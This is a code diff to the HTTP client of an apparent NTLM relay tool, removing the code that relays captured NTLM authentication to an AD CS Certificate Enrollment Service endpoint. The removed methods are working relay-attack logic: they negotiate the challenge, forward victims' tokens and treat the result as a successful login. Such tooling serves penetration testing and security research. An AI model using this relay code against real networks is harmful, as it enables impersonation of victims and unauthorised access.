@@ -55,9 +55,6 @@ class HTTPRelayClient(ProtocolClient):
         return True
 
     def sendNegotiate(self,negotiateMessage):
-        if getattr(self.serverConfig, 'isCESAttack', False):
-            return self._sendCESNegotiate(negotiateMessage)
-
         #Check if server wants auth
         if self.query:
             self.session.request('GET', self.path + '?' + self.query)
@@ -103,9 +100,6 @@ class HTTPRelayClient(ProtocolClient):
             return False
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
-        if getattr(self.serverConfig, 'isCESAttack', False):
-            return self._sendCESAuth(authenticateMessageBlob)
-
         if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
             if respToken2.isNegoExSelected():
@@ -128,112 +122,6 @@ class HTTPRelayClient(ProtocolClient):
             #Cache this
             self.lastresult = res.read()
             return None, STATUS_SUCCESS
-
-    def _cesPath(self):
-        return self.path + (('?' + self.query) if self.query else '')
-
-    @staticmethod
-    def _cesHeaders(authorization=None):
-        headers = {
-            'Content-Type': 'application/soap+xml; charset=utf-8',
-            'User-Agent': 'MS-WebServices/1.0',
-            'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
-            'Content-Length': '0',
-        }
-        if authorization is not None:
-            headers['Authorization'] = authorization
-        return headers
-
-    @staticmethod
-    def _wwwAuthenticate(response):
-        values = []
-        try:
-            values = response.msg.get_all('WWW-Authenticate') or []
-        except AttributeError:
-            pass
-        if not values:
-            value = response.getheader('WWW-Authenticate')
-            if value:
-                values = [value]
-        return ', '.join(values)
-
-    def _cesEmptyPost(self, authorization=None):
-        self.session.request('POST', self._cesPath(), body=b'', headers=self._cesHeaders(authorization))
-        response = self.session.getresponse()
-        body = response.read()
-        return response, body
-
-    def _sendCESNegotiate(self, negotiateMessage):
-        response, _ = self._cesEmptyPost()
-        offered = self._wwwAuthenticate(response)
-        if response.status != 401:
-            LOG.error(
-                'CES target did not request authentication for POST %s (HTTP %d %s)'
-                % (self._cesPath(), response.status, response.reason)
-            )
-            return False
-        if not offered:
-            LOG.error('CES target returned HTTP 401 without WWW-Authenticate for url %s' % self.targetHost)
-            return False
-        if 'NTLM' not in offered.upper() and 'NEGOTIATE' not in offered.upper():
-            LOG.error('NTLM/Negotiate not offered by CES URL, offered protocols: %s' % offered)
-            return False
-
-        # CES commonly advertises Negotiate while expecting a raw NTLMSSP token.
-        self.authenticationMethod = 'Negotiate'
-        authorization = 'Negotiate %s' % base64.b64encode(negotiateMessage).decode('ascii')
-        response, _ = self._cesEmptyPost(authorization)
-        offered = self._wwwAuthenticate(response)
-        matches = re.findall(r'(?:^|[,\s])Negotiate\s+([A-Za-z0-9+/]+={0,2})(?=\s*,|\s*$)', offered, re.I)
-        if len(matches) != 1:
-            LOG.error('CES endpoint returned an absent or ambiguous NTLM challenge')
-            return False
-        try:
-            serverChallenge = base64.b64decode(matches[0], validate=True)
-            if serverChallenge[:1] == bytes([SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP]):
-                responseToken = SPNEGO_NegTokenResp(serverChallenge)
-                if responseToken.isNegoExSelected():
-                    LOG.info('Target selected NEGOEX/PKU2U authentication, relay currently not supported')
-                    return False
-                serverChallenge = responseToken['ResponseToken']
-            challenge = NTLMAuthChallenge()
-            challenge.fromString(serverChallenge)
-            return challenge
-        except Exception as exc:
-            # Structure parsing can raise different exception types across
-            # supported pyasn1/Impacket versions; malformed remote data fails closed.
-            LOG.error('Invalid NTLM challenge returned from CES endpoint: %s' % exc)
-            return False
-
-    def _sendCESAuth(self, authenticateMessageBlob):
-        if not authenticateMessageBlob:
-            LOG.error('Empty NTLM authenticate message for CES endpoint')
-            return None, STATUS_ACCESS_DENIED
-        try:
-            if authenticateMessageBlob[:1] == bytes([SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP]):
-                responseToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
-                if responseToken.isNegoExSelected():
-                    LOG.info('Target selected NEGOEX/PKU2U authentication, relay currently not supported')
-                    return None, STATUS_ACCESS_DENIED
-                token = responseToken['ResponseToken']
-            else:
-                token = authenticateMessageBlob
-            if not token:
-                raise ValueError('authenticate token is empty')
-        except Exception as exc:
-            LOG.error('Malformed NTLM authenticate message for CES endpoint: %s' % exc)
-            return None, STATUS_ACCESS_DENIED
-
-        authorization = 'Negotiate %s' % base64.b64encode(token).decode('ascii')
-        response, body = self._cesEmptyPost(authorization)
-        if response.status == 401:
-            LOG.error('CES rejected the relayed NTLM authenticate message')
-            return None, STATUS_ACCESS_DENIED
-        LOG.info('CES endpoint returned HTTP %d after relay authentication, treating as a successful login' % response.status)
-        self.lastresult = body
-        return None, STATUS_SUCCESS
 
     def killConnection(self):
         if self.session is not None:
